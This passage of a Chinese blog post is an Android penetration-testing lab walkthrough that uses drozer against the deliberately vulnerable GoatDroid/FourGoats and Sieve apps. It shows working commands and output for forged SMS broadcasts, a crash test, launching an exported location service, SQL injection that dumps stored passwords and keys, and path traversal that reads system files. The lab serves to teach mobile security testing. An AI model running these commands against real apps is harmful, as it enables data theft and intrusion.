+<p>接下来要审计源码，源码的获取过程：smail——&gt;dex——jar</p>
+<p>smail2dex：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">usage：<br>java -jar smali.jar &lt;smail path&gt; -o &lt;classes path&gt;<br>注：smail directory为smail文件的目录。classes directory为目录加文件名<br><br>example：<br>java -jar smali-<span class="hljs-number">2.1</span>.<span class="hljs-number">2</span>.jar  <span class="hljs-regexp">/root/</span>tools<span class="hljs-regexp">/android/</span>AndroidTools<span class="hljs-regexp">/AppInfoScanner/</span>out<span class="hljs-regexp">/goatdroid/</span>smali -o AppInfoScanner<span class="hljs-regexp">/out/g</span>oatdroid/classes.dex<br><br>报错：<br>root@kali:~<span class="hljs-regexp">/tools/</span>android<span class="hljs-regexp">/AndroidTools# java -jar smali.jar /</span>root<span class="hljs-regexp">/tools/</span>android<span class="hljs-regexp">/AndroidTools/</span>AppInfoScanner<span class="hljs-regexp">/out/g</span>oatdroid<span class="hljs-regexp">/smali -o AppInfoScanner/</span>out<span class="hljs-regexp">/goatdroid/</span>classes.dex<br>Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;main&quot;</span> com.beust.jcommander.MissingCommandException: Expected a command, got <span class="hljs-regexp">/root/</span>tools<span class="hljs-regexp">/android/</span>AndroidTools<span class="hljs-regexp">/AppInfoScanner/</span>out<span class="hljs-regexp">/goatdroid/</span>smali<br>	at com.beust.jcommander.JCommander.parseValues(JCommander.java:<span class="hljs-number">725</span>)<br>	at com.beust.jcommander.JCommander.parse(JCommander.java:<span class="hljs-number">304</span>)<br>	at com.beust.jcommander.JCommander.parse(JCommander.java:<span class="hljs-number">287</span>)<br>	at org.jf.smali.Main.main(Main.java:<span class="hljs-number">87</span>)<br>解决方法：<br>使用smail-<span class="hljs-number">2.1</span>.<span class="hljs-number">2</span>.jar<br>参考文章：https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/lihonghao1017/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">112776892</span><br><br>smail.jar下载地址：https:<span class="hljs-regexp">//</span>bitbucket.org<span class="hljs-regexp">/JesusFreke/</span>smali<span class="hljs-regexp">/downloads/</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105102631646.png" srcset="/img/loading.gif" lazyload alt="image-20211105102631646"></p>
+<p>dex2jar：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts">安装：<br>	下载解压后，加入环境变量即可。<br>usage：<br>d2j-dex2jar.sh <span class="hljs-params">&lt;classes path&gt;</span> -o  <span class="hljs-params">&lt;jar path&gt;</span><br><span class="hljs-symbol">example:</span><br>./d2j-dex2jar.sh classes.dex -o classes.jar<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105103800544.png" srcset="/img/loading.gif" lazyload alt="image-20211105103800544"></p>
+<p>从源码中看到，需要phoneNumber和message两个参数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105104624423.png" srcset="/img/loading.gif" lazyload alt="image-20211105104624423"></p>
+<p><strong>漏洞利用，可发送恶意广播包</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">run app<span class="hljs-selector-class">.broadcast</span><span class="hljs-selector-class">.send</span> --action org<span class="hljs-selector-class">.owasp</span><span class="hljs-selector-class">.goatdroid</span><span class="hljs-selector-class">.fourgoats</span><span class="hljs-selector-class">.SOCIAL_SMS</span> --extra string phoneNumber <span class="hljs-number">1234</span> --extra string message pwnd!<br></code></pre></td></tr></table></figure>
+
+<p>注：在安卓8上未复现成功，应该是版本较高所致，随后在较低的版本上测试一下。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/111.webp" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>漏洞利用，拒绝服务攻击检测</strong></p>
+<p>尝试拒绝服务攻击检测，向广播组件发送不完整intent使用空extras，可看到应用停止运行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105105512586.png" srcset="/img/loading.gif" lazyload alt="image-20211105105512586"></p>
+<h4 id="services组件"><a href="#services组件" class="headerlink" title="services组件"></a>services组件</h4><blockquote>
+<p>一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。较好的一个例子就是一个正在从播放列表中播放歌曲的媒体播放器。在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。</p>
+<p>然而，音乐重放这个功能并没有对应的activity，因为使用者当然会认为在导航到其它屏幕时音乐应该还在播放的。在这个例子中，媒体播放器这个activity 会使用Context.startService()来启动一个service，从而可以在后台保持音乐的播放。同时，系统也将保持这个service 一直执行，直到这个service 运行结束。</p>
+<p>另外，我们还可以通过使用Context.bindService()方法，连接到一个service 上（如果这个service 还没有运行将启动它）。当连接到一个service 之后，我们还可以service 提供的接口与它进行通讯。拿媒体播放器这个例子来说，我们还可以进行暂停、重播等操作。 intent-filter未将exported设置为false，默认是可以导出的。</p>
+</blockquote>
+<p>测试app：fourgoats的app，名称为，goatdroid.apk</p>
+<p>分析AndroidManifest.xml </p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105110557615.png" srcset="/img/loading.gif" lazyload alt="image-20211105110557615"></p>
+<p>org.owasp.fourgoats.goatdroid.LocationService服务被导出，不需要任何权限。所以这意味着任何与FourGoats应用程序安装在设备上的恶意应用程序可以访问设备的位置。</p>
+<p><strong>尝试启动特定服务</strong>：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 查看攻击面</span><br>dz&gt; <span class="hljs-builtin-name">run</span> app.package.attacksurface org.owasp.goatdroid.fourgoats<br>Attack Surface:<br>  4 activities exported<br>  1 broadcast receivers exported<br>  0 content providers exported<br>  1 services exported<br>    is debuggable<br><br><span class="hljs-comment"># 查看services信息</span><br>dz&gt; <span class="hljs-builtin-name">run</span> app.service.<span class="hljs-builtin-name">info</span> -a org.owasp.goatdroid.fourgoats<br>Package: org.owasp.goatdroid.fourgoats<br>  org.owasp.goatdroid.fourgoats.services.LocationService<br>    Permission: <span class="hljs-literal">null</span><br><br><span class="hljs-comment"># 启动位置服务</span><br>dz&gt; <span class="hljs-builtin-name">run</span> app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService<br></code></pre></td></tr></table></figure>
+
+<h4 id="content组件"><a href="#content组件" class="headerlink" title="content组件"></a>content组件</h4><blockquote>
+<p>android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。</p>
+</blockquote>
+<p>测试app：sieve.apk</p>
+<p><strong>信息泄露利用</strong>：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs vim">扫描并获取Content Provider信息，并列出了可访问内容URI的列表和路径：<br>dz&gt; run scanner.provider.finduris -<span class="hljs-keyword">a</span> <span class="hljs-keyword">com</span>.mwr.example.sieve<br>Scanning <span class="hljs-keyword">com</span>.mwr.example.sieve...<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.FileBackupProvider/<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider<br>Able <span class="hljs-keyword">to</span> Query    conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Passwords/<br>Able <span class="hljs-keyword">to</span> Query    conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Keys/<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.FileBackupProvider<br>Able <span class="hljs-keyword">to</span> Query    conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Passwords<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Keys<br><br>Accessible content URI<span class="hljs-variable">s:</span><br>  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Keys/<br>  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Passwords<br>  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Passwords/<br>  <br># 查询或修改数据库中的数据，发现存在数据泄露问题，访问uri可看到一些敏感信息<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105112731220.png" srcset="/img/loading.gif" lazyload alt="image-20211105112731220"></p>
+<p><strong>SQL注入漏洞</strong>：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">同样content可能导致注入问题。使用以下语句进行测试发现报错，说明存在SQL注入漏洞。<br>dz&gt; <span class="hljs-keyword">run</span> <span class="hljs-keyword">app</span>.provider.<span class="hljs-keyword">query</span> content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot; </span><br>unrecognized <span class="hljs-keyword">token</span>: <span class="hljs-string">&quot;&#x27; FROM Passwords&quot;</span> (code 1): , <span class="hljs-keyword">while</span> compiling: SELECT &#x27; FROM Passwords<br>dz&gt; <span class="hljs-keyword">run</span> <span class="hljs-keyword">app</span>.provider.<span class="hljs-keyword">query</span> content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &quot;&#x27;&quot; </span><br>unrecognized <span class="hljs-keyword">token</span>: <span class="hljs-string">&quot;&#x27;)&quot;</span> (code 1): , <span class="hljs-keyword">while</span> compiling: SELECT * FROM Passwords WHERE (&#x27;)<br><br></code></pre></td></tr></table></figure>
+
+<p><strong>列出所有表的信息</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dz&gt; run app.provider.query content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span> --projection <span class="hljs-string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105113213318.png" srcset="/img/loading.gif" lazyload alt="image-20211105113213318"></p>
+<p><strong>获取具体表的信息</strong></p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection <span class="hljs-string">&quot;* FROM Key;--&quot;</span><br>|<span class="hljs-string"> Password           </span>|<span class="hljs-string"> pin  </span>|<br>|<span class="hljs-string"> testtest1234567890 </span>|<span class="hljs-string"> 1234 </span>|<br></code></pre></td></tr></table></figure>
+
+<p><strong>对注入点进行扫描</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">dz&gt; run scanner.provider.injection -a  com.mwr.example.sieve<br>Scanning com.mwr.example.sieve...<br>Not Vulnerable:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Keys<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider/<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider<br><br>Injection <span class="hljs-keyword">in</span> Projection:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Keys/</span><br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Passwords<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span><br><br>Injection <span class="hljs-keyword">in</span> Selection:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Keys/</span><br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Passwords<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>列出该app的表信息</strong>：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">dz&gt; run scanner.provider.sqltables -a  com.mwr.example.sieve<br>Scanning com.mwr.example.sieve...<br>Accessible tables <span class="hljs-keyword">for</span> uri content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span>:<br>  android_metadata<br>  Passwords<br>  Key<br><br>Accessible tables <span class="hljs-keyword">for</span> uri content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Keys/</span>:<br>  android_metadata<br>  Passwords<br>  Key<br><br>Accessible tables <span class="hljs-keyword">for</span> uri content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Passwords:<br>  android_metadata<br>  Passwords<br>  Key<br></code></pre></td></tr></table></figure>
+
+<p><strong>底层文件系统读取和写入（有可能被阻止）</strong></p>
+<p>文件读取：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts <br><span class="hljs-number">127.0.0.1</span>       localhost<br>::<span class="hljs-number">1</span>             ip6-localhost<br></code></pre></td></tr></table></figure>
+
+<p>文件下载：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">dz&gt; run app.provider.download content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider<span class="hljs-regexp">/etc/</span>hosts <span class="hljs-regexp">/root/</span>documents<span class="hljs-regexp">/pentest/</span>apptest/<br>Written <span class="hljs-number">56</span> bytes<br></code></pre></td></tr></table></figure>
+
+<p><strong>目录遍历漏洞</strong>：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"> dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve<br>Scanning com.mwr.example.sieve...<br>Not Vulnerable:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Keys<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span><br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Keys/</span><br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Passwords<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<br><br>Vulnerable Providers:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider/<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider<br></code></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269196.htm">Android漏洞挖掘三板斧——drozer+Inspeckage(xposed)+MobSF</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfa92bab3a55">Android安全测试框架Drozer（使用篇）</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Android/">Android</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    作者：C0mpactDisk，本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/02/frida%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">frida基础学习(1)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a  target="_blank" rel="nofollow noopener"><span>C0mpactDisk</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
